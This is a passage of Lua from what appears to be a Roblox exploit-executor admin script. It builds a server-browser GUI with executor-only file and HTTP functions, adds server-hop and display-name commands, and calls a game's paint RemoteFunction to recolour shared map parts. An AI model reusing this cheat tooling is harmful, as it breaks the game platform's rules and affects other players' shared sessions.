local data = game:GetService("HttpService"):JSONDecode(HttpRequest({Url="https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100"}).Body).data

Servers = {}

for i,v in pairs(data) do
	local ImportantData = {
		["Job ID"] = v.id,
		["Ping"] = v.ping,
		["Players"] = v.playing
	}
	local PlayerIcons = {}
	
	local Icons = {}
	for i2,v2 in pairs(v.playerTokens) do
		table.insert(Icons,{token=v.playerTokens[i2],type="AvatarHeadshot",size="150x150",requestId=v.id})
	end
	
	if not isfolder("ImgIcons") then
		makefolder("ImgIcons")
	end
	
	local Images = game:GetService("HttpService"):JSONDecode(HttpRequest({Url="https://thumbnails.roblox.com/v1/batch",Method="POST",Body=game:GetService("HttpService"):JSONEncode(Icons),Headers={["Content-Type"]="application/json"}}).Body).data
	for i2,v2 in pairs(Images) do
		if v2.imageUrl then
			local ImgID = v2.imageUrl:split("rbxcdn.com/")[2]:split("/150/150")[1]
			if isfile("ImgIcons/"..ImgID..".png") then
				--table.insert(PlayerIcons,getcustomasset("ImgIcons/"..ImgID..".png",true))
				table.insert(PlayerIcons,"ImgIcons/"..ImgID..".png")
			else
				writefile("ImgIcons/"..ImgID..".png",HttpRequest({Url=v2.imageUrl,Method="GET"}).Body)
				--table.insert(PlayerIcons,getcustomasset("ImgIcons/"..ImgID..".png",true))
				table.insert(PlayerIcons,"ImgIcons/"..ImgID..".png")
			end
		else
			table.insert(PlayerIcons,"rbxassetid://14968663868")
		end
	end
	
	ImportantData["Icon Images"] = PlayerIcons
	
	table.insert(Servers,ImportantData)
end
end

loadServers()

local UI = Instance.new("ScreenGui")
spawn(function()
local main = Instance.new("Frame")
local UICorner = Instance.new("UICorner")
local title = Instance.new("Frame")
local UICorner_2 = Instance.new("UICorner")
local noround = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local x = Instance.new("TextButton")
local bg = Instance.new("Frame")
local UICorner_3 = Instance.new("UICorner")
local noroundbottom = Instance.new("Frame")
local noroundleft = Instance.new("Frame")
local ImageLabel = Instance.new("ImageLabel")
local i = Instance.new("TextButton")
local bg_2 = Instance.new("Frame")
local ImageLabel_2 = Instance.new("ImageLabel")
local importantdata = Instance.new("Frame")
local UICorner_4 = Instance.new("UICorner")
local scroll = Instance.new("ScrollingFrame")
local template = Instance.new("Frame")
local Icons = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local UIPadding = Instance.new("UIPadding")
local template_2 = Instance.new("ImageLabel")
local UICorner_5 = Instance.new("UICorner")
local Join = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")
local UIPadding_2 = Instance.new("UIPadding")
local UIGridLayout_2 = Instance.new("UIGridLayout")

UI.Parent = game.CoreGui
UI.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
UI.ResetOnSpawn = false

main.Name = "main"
main.Parent = UI
main.BackgroundColor3 = Color3.fromRGB(39, 39, 39)
main.BorderColor3 = Color3.fromRGB(0, 0, 0)
main.BorderSizePixel = 0
main.Position = UDim2.new(0.174539626, 0, 0.191463396, 0)
main.Size = UDim2.new(0, 597, 0, 436)

UICorner.Parent = main

title.Name = "title"
title.Parent = main
title.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
title.BorderColor3 = Color3.fromRGB(0, 0, 0)
title.BorderSizePixel = 0
title.Size = UDim2.new(1, 0, 0, 30)

UICorner_2.Parent = title

noround.Name = "noround"
noround.Parent = title
noround.BackgroundColor3 = Color3.fromRGB(32, 32, 32)
noround.BorderColor3 = Color3.fromRGB(0, 0, 0)
noround.BorderSizePixel = 0
noround.Position = UDim2.new(0, 0, 0.5, 0)
noround.Size = UDim2.new(1, 0, 0.5, 0)

TextLabel.Parent = title
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0, 10, 0, 0)
TextLabel.Size = UDim2.new(1, -20, 1, 0)
TextLabel.Font = Enum.Font.Code
TextLabel.Text = "Servers"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextSize = 28.000
TextLabel.TextXAlignment = Enum.TextXAlignment.Left

x.Name = "x"
x.Parent = title
x.AnchorPoint = Vector2.new(1, 0)
x.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
x.BackgroundTransparency = 1.000
x.BorderColor3 = Color3.fromRGB(0, 0, 0)
x.BorderSizePixel = 0
x.Position = UDim2.new(1, 0, 0, 0)
x.Size = UDim2.new(0, 50, 1, 0)
x.Font = Enum.Font.SourceSans
x.Text = ""
x.TextColor3 = Color3.fromRGB(0, 0, 0)
x.TextSize = 14.000

bg.Name = "bg"
bg.Parent = x
bg.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
bg.BackgroundTransparency = 1.000
bg.BorderColor3 = Color3.fromRGB(0, 0, 0)
bg.BorderSizePixel = 0
bg.Size = UDim2.new(1, 0, 1, 0)

UICorner_3.Parent = bg

noroundbottom.Name = "noroundbottom"
noroundbottom.Parent = bg
noroundbottom.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
noroundbottom.BackgroundTransparency = 1.000
noroundbottom.BorderColor3 = Color3.fromRGB(0, 0, 0)
noroundbottom.BorderSizePixel = 0
noroundbottom.Position = UDim2.new(0, 0, 0.5, 0)
noroundbottom.Size = UDim2.new(1, 0, 0.5, 0)

noroundleft.Name = "noroundleft"
noroundleft.Parent = bg
noroundleft.BackgroundColor3 = Color3.fromRGB(196, 43, 28)
noroundleft.BackgroundTransparency = 1.000
noroundleft.BorderColor3 = Color3.fromRGB(0, 0, 0)
noroundleft.BorderSizePixel = 0
noroundleft.Size = UDim2.new(0.5, 0, 1, 0)

ImageLabel.Parent = x
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel.BorderSizePixel = 0
ImageLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel.Size = UDim2.new(0, 12, 0, 12)
ImageLabel.Image = "rbxassetid://14953690570"

i.Name = "i"
i.Parent = title
i.AnchorPoint = Vector2.new(1, 0)
i.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
i.BackgroundTransparency = 1.000
i.BorderColor3 = Color3.fromRGB(0, 0, 0)
i.BorderSizePixel = 0
i.Position = UDim2.new(1, -50, 0, 0)
i.Size = UDim2.new(0, 50, 1, 0)
i.Font = Enum.Font.SourceSans
i.Text = ""
i.TextColor3 = Color3.fromRGB(0, 0, 0)
i.TextSize = 14.000

bg_2.Name = "bg"
bg_2.Parent = i
bg_2.BackgroundColor3 = Color3.fromRGB(212,166,0)
bg_2.BackgroundTransparency = 1.000
bg_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
bg_2.BorderSizePixel = 0
bg_2.Size = UDim2.new(1, 0, 1, 0)

ImageLabel_2.Parent = i
ImageLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0.5, 0, 0.5, 0)
ImageLabel_2.Size = UDim2.new(0, 12, 0, 12)
ImageLabel_2.Image = "rbxassetid://14969600275"

importantdata.Name = "importantdata"
importantdata.Parent = main
importantdata.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
importantdata.BorderColor3 = Color3.fromRGB(0, 0, 0)
importantdata.BorderSizePixel = 0
importantdata.Position = UDim2.new(0, 10, 0, 40)
importantdata.Size = UDim2.new(1, -20, 1, -50)

UICorner_4.Parent = importantdata

scroll.Name = "scroll"
scroll.Parent = importantdata
scroll.Active = true
scroll.BackgroundColor3 = Color3.fromRGB(44, 44, 44)
scroll.BackgroundTransparency = 1.000
scroll.BorderColor3 = Color3.fromRGB(0, 0, 0)
scroll.BorderSizePixel = 0
scroll.Size = UDim2.new(1, 0, 1, 0)

template.Name = "template"
template.Parent = scroll
template.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
template.BackgroundTransparency = 0.800
template.BorderColor3 = Color3.fromRGB(0, 0, 0)
template.BorderSizePixel = 0
template.Size = UDim2.new(0, 150, 0, 108)

Icons.Name = "Icons"
Icons.Parent = template
Icons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icons.BackgroundTransparency = 1.000
Icons.BorderColor3 = Color3.fromRGB(0, 0, 0)
Icons.BorderSizePixel = 0
Icons.Size = UDim2.new(1, 0, 1, -50)

UIGridLayout.Parent = Icons
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 56, 0, 56)

UIPadding.Parent = Icons
UIPadding.PaddingLeft = UDim.new(0, 5)
UIPadding.PaddingTop = UDim.new(0, 5)

template_2.Name = "template"
template_2.Parent = Icons
template_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
template_2.BorderSizePixel = 0
template_2.Position = UDim2.new(0, 5, 0, 5)
template_2.Size = UDim2.new(0, 100, 0, 100)
template_2.Image = "rbxassetid://14968663868"

UICorner_5.Parent = template

Join.Name = "Join"
Join.Parent = template
Join.AnchorPoint = Vector2.new(0.5, 1)
Join.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Join.BackgroundTransparency = 0.900
Join.BorderColor3 = Color3.fromRGB(0, 0, 0)
Join.BorderSizePixel = 0
Join.Position = UDim2.new(0.5, 0, 1, -10)
Join.Size = UDim2.new(1, -20, 0, 30)
Join.Font = Enum.Font.Code
Join.Text = "Join"
Join.TextColor3 = Color3.fromRGB(255, 255, 255)
Join.TextSize = 14.000

UICorner_6.Parent = Join

UIPadding_2.Parent = scroll
UIPadding_2.PaddingLeft = UDim.new(0, 5)
UIPadding_2.PaddingTop = UDim.new(0, 5)

UIGridLayout_2.Parent = scroll
UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout_2.CellSize = UDim2.new(0, 250, 0, 200)

UI.Name = "iiStupidAdmin serverbrowser"
end)
repeat game:GetService("RunService").RenderStepped:Wait() until UI.Name == "iiStupidAdmin serverbrowser"
function lerp(s,e,inb)
    return s+(e-s)*inb
end

local hoveringoverx = false
UI.main.title.x.MouseEnter:Connect(function()
	hoveringoverx=true
end)
UI.main.title.x.MouseLeave:Connect(function()
	hoveringoverx=false
end)
UI.main.title.x.MouseButton1Click:Connect(function()
	UI:Destroy()
end)

local hoveringoveri = false
UI.main.title.i.MouseEnter:Connect(function()
	hoveringoveri=true
end)
UI.main.title.i.MouseLeave:Connect(function()
	hoveringoveri=false
end)

local funnylerpx = 1
local funnylerpi = 1
spawn(function()
	while true do game:GetService("RunService").RenderStepped:Wait()
		if hoveringoverx then
			funnylerpx = lerp(funnylerpx,0,0.1)
		else
			funnylerpx = lerp(funnylerpx,1,0.1)
		end
		
		UI.main.title.x.bg.BackgroundTransparency = funnylerpx
		UI.main.title.x.bg.noroundbottom.BackgroundTransparency = funnylerpx
		UI.main.title.x.bg.noroundleft.BackgroundTransparency = funnylerpx
		
		if hoveringoveri then
			funnylerpi = lerp(funnylerpi,0,0.1)
		else
			funnylerpi = lerp(funnylerpi,1,0.1)
		end
		
		UI.main.title.i.bg.BackgroundTransparency = funnylerpi
		UI.main.title.i.ImageLabel.Rotation = lerp(UI.main.title.i.ImageLabel.Rotation,0,0.1)
	end
end)

spawn(function()
	local UserInputService = game:GetService("UserInputService")
	
	local gui = UI.main
					
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	local function update(input)
		local delta = input.Position - dragStart
		gui.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
					
	gui.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
					
	UserInputService.InputChanged:Connect(function(input)
		if input == dragInput and dragging then
			if gui.Visible then
				update(input)
			end
		end
	end)
end)

local function loadVisualServers()
if not UI.main.importantdata.scroll:FindFirstChild("template") then
for i,v in pairs(UI.main.importantdata.scroll:GetChildren()) do
if v:IsA("Frame") then
v:Destroy()
end
end

local template = Instance.new("Frame")
local Icons = Instance.new("Frame")
local UIGridLayout = Instance.new("UIGridLayout")
local UIPadding = Instance.new("UIPadding")
local template_2 = Instance.new("ImageLabel")
local UICorner_5 = Instance.new("UICorner")
local Join = Instance.new("TextButton")
local UICorner_6 = Instance.new("UICorner")

template.Name = "template"
template.Parent = UI.main.importantdata.scroll
template.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
template.BackgroundTransparency = 0.800
template.BorderColor3 = Color3.fromRGB(0, 0, 0)
template.BorderSizePixel = 0
template.Size = UDim2.new(0, 150, 0, 108)

Icons.Name = "Icons"
Icons.Parent = template
Icons.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Icons.BackgroundTransparency = 1.000
Icons.BorderColor3 = Color3.fromRGB(0, 0, 0)
Icons.BorderSizePixel = 0
Icons.Size = UDim2.new(1, 0, 1, -50)

UIGridLayout.Parent = Icons
UIGridLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIGridLayout.CellSize = UDim2.new(0, 56, 0, 56)

UIPadding.Parent = Icons
UIPadding.PaddingLeft = UDim.new(0, 5)
UIPadding.PaddingTop = UDim.new(0, 5)

template_2.Name = "template"
template_2.Parent = Icons
template_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
template_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
template_2.BorderSizePixel = 0
template_2.Position = UDim2.new(0, 5, 0, 5)
template_2.Size = UDim2.new(0, 100, 0, 100)
template_2.Image = "rbxassetid://14968663868"

UICorner_5.Parent = template

Join.Name = "Join"
Join.Parent = template
Join.AnchorPoint = Vector2.new(0.5, 1)
Join.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Join.BackgroundTransparency = 0.900
Join.BorderColor3 = Color3.fromRGB(0, 0, 0)
Join.BorderSizePixel = 0
Join.Position = UDim2.new(0.5, 0, 1, -10)
Join.Size = UDim2.new(1, -20, 0, 30)
Join.Font = Enum.Font.Code
Join.Text = "Join"
Join.TextColor3 = Color3.fromRGB(255, 255, 255)
Join.TextSize = 14.000

UICorner_6.Parent = Join
end
local Template = UI.main.importantdata.scroll.template
for i,v in pairs(Servers) do
	local Server = Template:Clone()
	Server.Parent = UI.main.importantdata.scroll
	Server.Name = v["Job ID"]
	Server.Join.Text = "Join ("..v["Ping"].."ms)"
	
	for i,v in pairs(v["Icon Images"]) do
		pcall(function()
		local Icon = Server.Icons.template:Clone()
		Icon.Parent = Server.Icons
		if v ~= "rbxassetid://14968663868" then
			Icon.Image = getcustomasset(v,true)
		else
			Icon.Image = "rbxassetid://14968663868"
		end
		end)
	end
	
	Server.Join.MouseButton1Click:Connect(function()
		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId,v["Job ID"])	
	end)
	
	Server.Icons.template:Destroy()
end
Template:Destroy()
end

loadVisualServers()

UI.main.title.i.MouseButton1Click:Connect(function()
	UI.main.title.i.ImageLabel.Rotation=359
	loadServers()
	loadVisualServers()
end)

end)

addCommand("clearsavehop",{},function()
	delfile("PreviousServers.txt")
	GUI:SendMessage(ScriptName,"The previous servers have been reset.")
end)

addCommand("savehop",{},function()
	function GetOldServers()
		if isfile("PreviousServers.txt") then
			return readfile("PreviousServers.txt"):split(";")
		else
			return {}
		end
	end
	
	function WriteOldServers(Data)
		if isfile("PreviousServers.txt") then
			appendfile("PreviousServers.txt",";"..Data)
		else
			writefile("PreviousServers.txt",Data)
		end
	end
	
	function Savehop()
		local OldServers = GetOldServers()
		local Servers = {}
		for i,v in pairs(game:GetService("HttpService"):JSONDecode(game:HttpGet("https://games.roblox.com/v1/games/"..game.PlaceId.."/servers/Public?sortOrder=Asc&limit=100")).data) do
			if type(v)=="table" and v.maxPlayers>v.playing and v.id~=game.JobId and not table.find(OldServers,game.JobId) then
				table.insert(Servers,v.id)
			end
		end
		
		if not table.find(OldServers,game.JobId) then
			WriteOldServers(game.JobId)
		end
		if #Servers~=0 then
			game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, Servers[math.random(1,#Servers)])
		else
			print("No servers found, retrying in 10 seconds")
			spawn(function()
				wait(10)
				Savehop()
			end)
		end
	end
	
	Savehop()
	game:GetService("TeleportService").TeleportInitFailed:Connect(Savehop)
end)

addCommand("prompttoserverhop",{},function()
	if not Loops.prompttoserverhop then
		Loops.prompttoserverhop = true
		local bindable = Instance.new("BindableFunction")
		function bindable.OnInvoke(answer)
		    if answer == "Yep" then
		    	runCommand(prefix.."serverhop",{})
		    end
			Loops.prompttoserverhop = false
		end
		game:GetService("StarterGui"):SetCore("SendNotification", {
			Title = ScriptName,
			Text = "You may have been crashed. Would you like to serverhop?",
			Duration = math.huge,
			Callback = bindable,
			Button1 = "Yep",
			Button2 = "No"
		})
	end
end)

addCommand("removedisplaynames",{},function()
    local function characterAdded(charass)
        spawn(function()
            repeat wait() until charass and charass.Humanoid
            charass.Humanoid.DisplayName = charass.Humanoid.DisplayName.."\n(@"..charass.Name..")"
        end)
    end
    for _,v in pairs(game.Players:GetChildren()) do
        pcall(function()
        v.DisplayName = v.DisplayName.." (@"..v.Name..")"
        if v.Character and v.Character.Parent ~= nil then
            characterAdded(v.Character)
        end
        Connections["RDN"..v.Name]=v.CharacterAdded:Connect(characterAdded)
        end)
    end
    Connections.removedisplaynames = game.Players.PlayerAdded:Connect(function(player) pcall(function()
    player.DisplayName = player.DisplayName.." (@"..player.Name..")"
    if player.Character and player.Character.Parent ~= nil then
        characterAdded(player.Character)
    end
    Connections["RDN"..player.Name]=player.CharacterAdded:Connect(characterAdded)
    end) end)
end)

addCommand("fixdisplaynames",{},function()
    Connections.removedisplaynames:Disconnect()
    for i,v in pairs(Connections) do
        if i:sub(1,3)=="RDN" then Connections[i]:Disconnect() end
    end
    for i,v in pairs(game.Players:GetPlayers()) do
        v.DisplayName = v.DisplayName:split(" ")[1]
        pcall(function()
            if v and v.Character and v.Character.Parent ~= nil and v.Character.Humanoid then
                v.Character.Humanoid.DisplayName = v.DisplayName
            end
        end)
    end
end)

addCommand("clr",{},function()
	game.Players:Chat("clr")
	game.Players:Chat("unpaint all")
	game.Players:Chat("fix")
	runCommand(prefix.."fixcolor",{})
end)

addCommand("fixcolor",{},function()
    local ObbyDestroyed = false
    spawn(function()
    if game.Chat:FindFirstChild("Obby") then ObbyDestroyed = true runCommand(prefix.."localaddobby",{}) end
    end)
    spawn(function()
function transformToColor3(col)
	local r = col.r
	local g = col.g
	local b = col.b
	return Color3.new(r,g,b);
end
local v1 = "PaintPart"
		local remote = GetPaint():WaitForChild("Remotes").ServerControls
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v4 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Bright green"))
						}
					remote:InvokeServer(v1, v4)
				end
			end)
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
			spawn(function()
				if v:IsA("Part") then
					local v5 =
						{
							["Part"] = v,
							["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
						}
					remote:InvokeServer(v1, v5)
				end
			end)
		end


		--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetDescendants()) do
			if v:IsA("Part") then
				spawn(function()
					if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
						local v6 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Brick yellow"))
							}
						remote:InvokeServer(v1, v6)
					end
					
					if v.Name == "SmoothBlockModel40" then
						local v7 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Bright green"))
							}
						remote:InvokeServer(v1, v7)
					end
					
					if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
						local v8 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Bright red"))
							}
						remote:InvokeServer(v1, v8)
					end
					
					if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
						local v9 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark orange"))
							}
						remote:InvokeServer(v1, v9)
					end
					
					if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
						local v10 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Dark stone grey"))
							}
						remote:InvokeServer(v1, v10)
					end
					
					if v.Name == "SmoothBlockModel112" then
						local v11 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Medium blue"))
							}
						remote:InvokeServer(v1, v11)
					end
					
					if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
						local v12 =
							{
								["Part"] = v,
								["Color"] = transformToColor3(BrickColor.new("Reddish brown"))
							}
						remote:InvokeServer(v1, v12)
					end
					
					if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
						local v13 =
							{
								["Part"] = v,
